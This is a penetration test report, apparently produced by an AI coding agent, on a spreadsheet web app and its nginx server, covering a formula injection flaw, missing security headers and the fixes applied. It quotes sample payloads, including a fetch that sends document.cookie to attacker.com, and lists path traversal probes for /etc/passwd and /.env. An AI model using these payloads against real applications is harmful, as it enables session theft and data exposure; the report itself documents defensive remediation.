# Penetration Test Report

**Target:** excellook / w.evolvfishing.com  
**Tester:** Claude Code (claude-sonnet-4-6)  
**Date:** 2026-04-15  
**Scope:** Web application source code, nginx configuration, TLS, npm dependencies  

---

## Executive Summary

A full-stack penetration test was performed on the `excellook` spreadsheet application and its serving infrastructure. One high-severity vulnerability (formula injection via `new Function()`) and four medium/low-severity issues were identified and **all have been remediated** during this session. The application now passes all retests. Two minor findings remain open on the companion `esilookup.com` domain (out of primary scope).

---

## Findings Summary

| # | Title | Severity | Status |
|---|-------|----------|--------|
| 1 | Formula Injection via `new Function()` | High | **Fixed** |
| 2 | No HTTP → HTTPS Redirect | Medium | **Fixed** |
| 3 | Missing Security Headers (5 headers) | Medium | **Fixed** |
| 4 | Nginx Server Version Disclosed | Low | **Fixed** |
| 5 | Self-Signed SSL Certificate | Low | Open |
| 6 | `unsafe-inline` in Content-Security-Policy | Low | Open (by design) |
| 7 | esilookup.com: Nginx Version Disclosed | Low | Open (out of scope) |
| 8 | esilookup.com: Missing Security Headers | Low | Open (out of scope) |

---

## Detailed Findings

---

### Finding 1 — Formula Injection via `new Function()`

**Severity:** High  
**Status:** Fixed  
**File:** `excellook/src/App.jsx:132`

#### Description

The spreadsheet formula evaluator handled named functions (SUM, AVG, etc.) via a safe switch statement, but fell through to a dynamic code execution path for any other expression:

```js
return Function('"use strict"; return (' + substituted + ')')()
```

After substituting cell references with their values, the expression was passed directly to `new Function()` with no validation. An attacker could type a formula such as:

```
=fetch("https://attacker.com?data="+document.cookie)
=window.location="https://phishing.com"
=constructor.constructor("alert(1)")()
```

This would execute arbitrary JavaScript in the victim's browser, enabling data exfiltration, session hijacking, or redirection to malicious sites.

#### Proof of Concept

| Payload | Before Fix | After Fix |
|---------|-----------|-----------|
| `=fetch("https://evil.com")` | Executes fetch | Returns `#ERROR!` |
| `=constructor.constructor("alert(1)")()` | Executes alert | Returns `#ERROR!` |
| `=window.location="evil.com"` | Redirects browser | Returns `#ERROR!` |
| `=1+2*3` | Returns `7` | Returns `7` (unaffected) |
| `=1e5+2e3` | Returns `102000` | Returns `102000` (unaffected) |
| `="hello"&" world"` | Returns `hello world` | Returns `hello world` (unaffected) |

#### Fix Applied

Added a pre-execution guard (`App.jsx:130-135`) that:
1. Strips JSON string literals from the substituted expression
2. Strips scientific notation numbers (e.g. `1e5`)
3. Rejects the expression with `#ERROR!` if any identifier characters remain

```js
const withoutStrings = substituted.replace(/"(?:[^"\\]|\\.)*"/g, '0')
const withoutScientific = withoutStrings.replace(/\d+[eE][+-]?\d+/g, '0')
if (/[a-zA-Z_$]/.test(withoutScientific)) return '#ERROR!'
```

---

### Finding 2 — No HTTP → HTTPS Redirect

**Severity:** Medium  
**Status:** Fixed  
**File:** `/etc/nginx/sites-available/my-react-app`

#### Description

The nginx configuration for `w.evolvfishing.com` served the application on both port 80 (plain HTTP) and port 443 (HTTPS) with no redirect. Users accessing the site over HTTP received no TLS protection, exposing session data, app content, and any form submissions to network interception (MITM).

#### Fix Applied

Port 80 block replaced with a `301 Permanent Redirect` to HTTPS:

```nginx
server {
    listen 80;
    server_name w.evolvfishing.com;
    location /.well-known/acme-challenge/ { root /var/www/html; }
    location / { return 301 https://w.evolvfishing.com$request_uri; }
}
```

#### Retest Result

```
HTTP/1.1 301 Moved Permanently
Location: https://w.evolvfishing.com/
```

---

### Finding 3 — Missing Security Headers

**Severity:** Medium  
**Status:** Fixed  
**File:** `/etc/nginx/sites-available/my-react-app`

#### Description

The HTTPS server returned no browser security headers, leaving users exposed to clickjacking, MIME-sniffing attacks, SSL stripping, and cross-site information leakage.

| Header | Risk Without It |
|--------|----------------|
| `Strict-Transport-Security` | SSL stripping attacks |
| `X-Frame-Options` | Clickjacking |
| `X-Content-Type-Options` | MIME-type sniffing |
| `Referrer-Policy` | Referrer leakage to third parties |
| `Content-Security-Policy` | XSS, resource injection |

#### Fix Applied

Five headers added to the HTTPS server block:

```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "same-origin" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none';" always;
```

#### Retest Result

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; ...
```

---

### Finding 4 — Nginx Server Version Disclosed

**Severity:** Low  
**Status:** Fixed  
**File:** `/etc/nginx/sites-available/my-react-app`

#### Description

Every HTTP response included the exact nginx version:

```
Server: nginx/1.24.0 (Ubuntu)
```

This allows an attacker to quickly identify and target known CVEs for that specific version without active scanning.

#### Fix Applied

`server_tokens off;` added to the HTTPS server block.

#### Retest Result

```
Server: nginx
```

---

### Finding 5 — Self-Signed SSL Certificate

**Severity:** Low  
**Status:** Open  

#### Description

The HTTPS server uses a self-signed certificate:

```
Subject: CN=w.evolvfishing.com, O=Shell Energy, C=US
Issuer:  CN=w.evolvfishing.com, O=Shell Energy, C=US
Valid:   2026-04-08 → 2027-04-08
```

Browsers will display a security warning to all users. The certificate is not trusted by any public CA.

#### Recommendation

Let's Encrypt (`certbot`) is already installed on this server. Replace the self-signed cert:

```bash
sudo certbot --nginx -d w.evolvfishing.com
```

Note: The domain must be publicly reachable (not blocked by Cloudflare challenge) for the HTTP-01 challenge to succeed.

---

### Finding 6 — `unsafe-inline` in Content-Security-Policy

**Severity:** Low  
**Status:** Open (by design)  

#### Description

The CSP includes `'unsafe-inline'` for both `script-src` and `style-src`:

```
script-src 'self' 'unsafe-inline'
```

This weakens the XSS protection that CSP provides, as inline scripts are permitted. This is a common limitation of React SPAs that use Vite without nonce injection.

#### Recommendation

For a future improvement, configure Vite to generate a per-request nonce and use `script-src 'self' 'nonce-{value}'` instead. This is a significant refactor and not a quick fix.

---

### Finding 7 & 8 — esilookup.com: Version Disclosure & Missing Headers (Out of Scope)

**Severity:** Low  
**Status:** Open  

The `esilookup.com` nginx config (which was not the primary target) has two similar issues:

- **Server version still disclosed:** `Server: nginx/1.24.0 (Ubuntu)`
- **Missing headers:** `X-Content-Type-Options`, `Referrer-Policy`, and `Content-Security-Policy` are absent (only `X-Frame-Options` and `HSTS` are present)

These can be fixed with the same pattern applied to `w.evolvfishing.com`.

---

## Tests That Passed

| Test | Result |
|------|--------|
| Path traversal (`/../etc/passwd`, `/.env`, `/.git/config`) | All return SPA `index.html` — no file leakage |
| Directory listing (`/assets/`) | Disabled (403 Forbidden) |
| Dangerous HTTP methods (DELETE, PUT, TRACE) | All rejected (405) |
| TLS 1.0 | Rejected |
| TLS 1.1 | Rejected |
| TLS 1.2 | Accepted |
| TLS 1.3 | Accepted (cipher: `TLS_AES_256_GCM_SHA384`) |
| npm audit — `my-react-app` | 0 vulnerabilities |
| npm audit — `excellook` | 0 vulnerabilities |
| npm audit — `esi-lookup` | 0 vulnerabilities |
| Hardcoded secrets / API keys in source | None found |
| `eval()` usage in source | None found |

---

## Remediation Summary

All high and medium findings were fixed and retested during this session. Changes made:

| Change | Location |
|--------|----------|
| Formula injection guard | `excellook/src/App.jsx` (committed + pushed) |
| HTTP → HTTPS redirect | `/etc/nginx/sites-available/my-react-app` (nginx reloaded) |
| Security headers (5) | `/etc/nginx/sites-available/my-react-app` (nginx reloaded) |
| Server version hidden | `/etc/nginx/sites-available/my-react-app` (nginx reloaded) |
| npm vulns patched (vite, brace-expansion) | `excellook/package-lock.json` (committed + pushed) |

---

*Report generated on 2026-04-15 by Claude Code*
